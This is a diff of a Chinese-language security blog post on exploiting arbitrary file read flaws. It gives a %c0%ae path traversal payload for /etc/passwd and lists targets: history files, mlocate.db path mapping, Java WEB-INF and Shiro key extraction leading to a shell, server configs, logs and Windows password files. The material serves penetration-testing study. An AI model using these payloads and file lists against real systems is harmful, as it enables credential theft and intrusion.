class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/<span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span><span class="hljs-variable">%c0</span><span class="hljs-variable">%ae</span>/etc/passwd<br></code></pre></td></tr></table></figure>
-
-<h3 id="Linux下的常见利用姿势"><a href="#Linux下的常见利用姿势" class="headerlink" title="Linux下的常见利用姿势"></a>Linux下的常见利用姿势</h3><h4 id="用户目录下的敏感文件"><a href="#用户目录下的敏感文件" class="headerlink" title="用户目录下的敏感文件"></a>用户目录下的敏感文件</h4><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bash_history</span> <br><span class="hljs-string">.zsh_history</span><br><span class="hljs-string">.psql_history</span><br><span class="hljs-string">.mysql_history</span><br><span class="hljs-string">.profile</span> <br><span class="hljs-string">.bashrc</span><br><span class="hljs-string">.gitconfig</span><br><span class="hljs-string">.viminfo</span><br><br>任意文件读取<span class="hljs-string">/etc/passwd</span><br>提取passwd第一列，即root等一系列用户名<br>读<span class="hljs-keyword">history</span>：<span class="hljs-string">/root/.bash_history</span><br>暴破所有用户的<span class="hljs-string">.bash_history</span>：<span class="hljs-string">/home/</span>§root§<span class="hljs-string">/.bash_history</span><br></code></pre></td></tr></table></figure>
-
-<p>历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。 PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p>
-<h4 id="全路径"><a href="#全路径" class="headerlink" title="全路径"></a>全路径</h4><p>mlocate.db数据库里存储了本地所有文件的配置信息<br><code>/var/lib/mlocate/mlocate.db</code>利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息<br><code>locate mlocate.db config</code><br><code>locate mlocate.db webapps</code><br><code>locate mlocate.db www</code> </p>
+<h3 id="linux下的常见利用姿势">Linux下的常见利用姿势</h3>
+<h4 id="用户目录下的敏感文件">用户目录下的敏感文件</h4>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-string">.bash_history</span> <br><span class="hljs-string">.zsh_history</span><br><span class="hljs-string">.psql_history</span><br><span class="hljs-string">.mysql_history</span><br><span class="hljs-string">.profile</span> <br><span class="hljs-string">.bashrc</span><br><span class="hljs-string">.gitconfig</span><br><span class="hljs-string">.viminfo</span><br><br>任意文件读取<span class="hljs-string">/etc/passwd</span><br>提取passwd第一列，即root等一系列用户名<br>读<span class="hljs-keyword">history</span>：<span class="hljs-string">/root/.bash_history</span><br>暴破所有用户的<span class="hljs-string">.bash_history</span>：<span class="hljs-string">/home/</span>§root§<span class="hljs-string">/.bash_history</span><br></code></pre></td></tr></table></figure>
+<p>历史命令重点关注出现的密码、路径、配置文件路径、其他关联IP、日志文件、war包、备份文件路径等等，可进一步读取或利用。
+PS：如要下载文件，可能会导致过大文件下载失败，可以使用wget进行下载，比如catanlina.out日志文件、war包、备份文件等等。</p>
+<h4 id="全路径">全路径</h4>
+<p>mlocate.db数据库里存储了本地所有文件的配置信息
+<code>/var/lib/mlocate/mlocate.db</code>利用locate命令将数据输出成文件，这里面包含了全部的文件路径信息
+<code>locate mlocate.db config</code>
+<code>locate mlocate.db webapps</code>
+<code>locate mlocate.db www</code></p>
 <p>获取到路径后可以进一步挖掘敏感信息和系统漏洞</p>
-<h4 id="程序源代码"><a href="#程序源代码" class="headerlink" title="程序源代码"></a>程序源代码</h4><p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF&#x2F;web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。</p>
-<h4 id="应用配置文件"><a href="#应用配置文件" class="headerlink" title="应用配置文件"></a>应用配置文件</h4><p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p>
+<h4 id="程序源代码">程序源代码</h4>
+<p>利用全路径或者其他地方获取到的路径读取一些关键的程序源码。读取WEB-INF/web.xml，进一步读取class文件，反编译得到源码。读取war包，反编译获取源码。</p>
+<h4 id="应用配置文件">应用配置文件</h4>
+<p>获取到网站的相关配置信息，包括站点配置、数据库配置等等，也可进一步获取到源码。</p>
 <ul>
-<li>java站点<br><code>/WEB-INF/web.xml</code><br><code>/WEB-INF/classes/applicationContext.xml</code><br> <code>/WEB-INF/classes/xxx/xxx/xxx.class</code><br><code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li>
-<li>tomcat<br><code>/usr/local/tomcat/conf/tomcat-users.xml</code></li>
-<li>nginx<br><code>/www/nginx/conf/nginx.conf</code> <code>/etc/nginx/nginx.conf</code> <code>/usr/local/nginx/conf/nginx.conf</code> <code>/usr/local/etc/nginx/nginx.conf</code></li>
-<li>apache<br><code>/etc/httpd/conf/httpd.conf</code> <code>/etc/apache2/apache2.conf</code> <code>/etc/apache2/httpd.conf</code></li>
-<li>redis<br><code>/etc/redis.conf</code></li>
-<li>ssh<br><code>/etc/ssh/sshd_config</code></li>
+<li>java站点 <code>/WEB-INF/web.xml</code>
+<code>/WEB-INF/classes/applicationContext.xml</code>
+<code>/WEB-INF/classes/xxx/xxx/xxx.class</code>
+<code>core.jar</code>如果遇到Shiro站点，可以直接利用全路径找到core.jar，去下载core.jar，下载后反编译搜索<code>Base64.decode</code>直接找key，进而getshell。</li>
+<li>tomcat <code>/usr/local/tomcat/conf/tomcat-users.xml</code></li>
+<li>nginx <code>/www/nginx/conf/nginx.conf</code>
+<code>/etc/nginx/nginx.conf</code>
+<code>/usr/local/nginx/conf/nginx.conf</code>
+<code>/usr/local/etc/nginx/nginx.conf</code></li>
+<li>apache <code>/etc/httpd/conf/httpd.conf</code>
+<code>/etc/apache2/apache2.conf</code>
+<code>/etc/apache2/httpd.conf</code></li>
+<li>redis <code>/etc/redis.conf</code></li>
+<li>ssh <code>/etc/ssh/sshd_config</code></li>
 </ul>
-<h4 id="应用日志文件"><a href="#应用日志文件" class="headerlink" title="应用日志文件"></a>应用日志文件</h4><p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p>
+<h4 id="应用日志文件">应用日志文件</h4>
+<p>利用日志文件获取网站后台地址、api接口、备份、等等敏感信息。</p>
 <ul>
-<li>tomcat 可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径 <code>/webapps/ROOT/logs/catalina.out</code></li>
-<li>apache<br> <code>/var/log/apache2/access.log</code><br><code>/var/log/apache2/error.log</code><br><code>/var/log/httpd/access_log</code><br><code>/etc/httpd/logs/access_log</code><br><code>/etc/httpd/logs/error_log</code><br><code>/etc/httpd/logs/error.log</code></li>
-<li>nginx<br><code>/var/log/nginx/access.log</code><br><code>/var/log/nginx/error.log</code><br><code>/usr/local/var/log/nginx/access.log</code><br><code>/usr/local/nginx/logs</code></li>
+<li>tomcat
+可以先找到<code>/tomcat/bin/catalina.sh</code>，里边有log的配置路径
+<code>/webapps/ROOT/logs/catalina.out</code></li>
+<li>apache <code>/var/log/apache2/access.log</code>
+<code>/var/log/apache2/error.log</code>
+<code>/var/log/httpd/access_log</code>
+<code>/etc/httpd/logs/access_log</code>
+<code>/etc/httpd/logs/error_log</code>
+<code>/etc/httpd/logs/error.log</code></li>
+<li>nginx <code>/var/log/nginx/access.log</code>
+<code>/var/log/nginx/error.log</code>
+<code>/usr/local/var/log/nginx/access.log</code>
+<code>/usr/local/nginx/logs</code></li>
 </ul>
-<h3 id="Windows下的利用姿势"><a href="#Windows下的利用姿势" class="headerlink" title="Windows下的利用姿势"></a>Windows下的利用姿势</h3><h4 id="盲读取桌面文件"><a href="#盲读取桌面文件" class="headerlink" title="盲读取桌面文件"></a>盲读取桌面文件</h4><p>fuzz桌面文件，比如1.txt、2.txt、密码.txt、pass.txt、password.txt等。</p>
+<h3 id="windows下的利用姿势">Windows下的利用姿势</h3>
+<h4 id="盲读取桌面文件">盲读取桌面文件</h4>
+<p>fuzz桌面文件，比如1.txt、2.txt、密码.txt、pass.txt、password.txt等。</p>
 
                 
               </div>
@@ -642,6 +728,12 @@
 
 
 
+  
+
+
+
+
+  
   
 
 
@@ -860,6 +952,49 @@
   });
 </script>
 
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+
+        Fluid.events.registerRefreshCallback(function() {
+          if ('MathJax' in window && MathJax.startup.document && typeof MathJax.startup.document.state === 'function') {
+            MathJax.startup.document.state(0);
+            MathJax.texReset();
+            MathJax.typeset();
+            MathJax.typesetPromise();
+          }
+        });
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.2/es5/tex-mml-chtml.js" ></script>
 
   <script  src="/js/local-search.js" ></script>
 
